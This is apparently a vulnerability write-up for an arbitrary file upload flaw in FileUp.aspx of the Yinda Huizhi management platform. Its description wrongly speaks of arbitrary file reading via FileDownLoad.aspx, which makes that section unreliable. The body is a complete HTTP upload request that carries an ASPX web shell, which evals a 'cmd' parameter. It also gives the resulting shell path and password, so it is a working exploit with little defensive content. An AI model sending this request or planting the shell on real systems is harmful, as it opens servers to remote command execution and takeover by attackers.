# Yinda Huizhi Smart Comprehensive Management Platform FileUp.aspx Any file upload vulnerability

## Vulnerability Description

Yinda Huizhi Intelligent Comprehensive Management Platform FileDownLoad.aspx There is a vulnerability to read any file in the server. Through the vulnerability attacker, any file in the server can be downloaded.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Yinda Huizhi Intelligent Comprehensive Management Platform </span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed.png)

File upload request package

```bash
POST /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 337
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9

--62907949903a4c499178971c9dab4ad9
Content-Disposition: form-data; name="Filedata"; filename="abc.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript"%><%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());eval(Request.Item["cmd"],"unsafe");%>
--62907949903a4c499178971c9dab4ad9--
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629368451848-7ecbcd3e-82cc-4608-b9a9-a312826248ea.png)

The response package will return the file name, and the uploaded directory is

```bash
/imgnews/imgcontent/1/xxxxxxxxxx.aspx
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629368525052-fffda86a-30fa-4dc0-a3a0-537a0be5b5c3.png)

The Trojan horse is uploaded successfully as shown in the picture, with the password `cmd`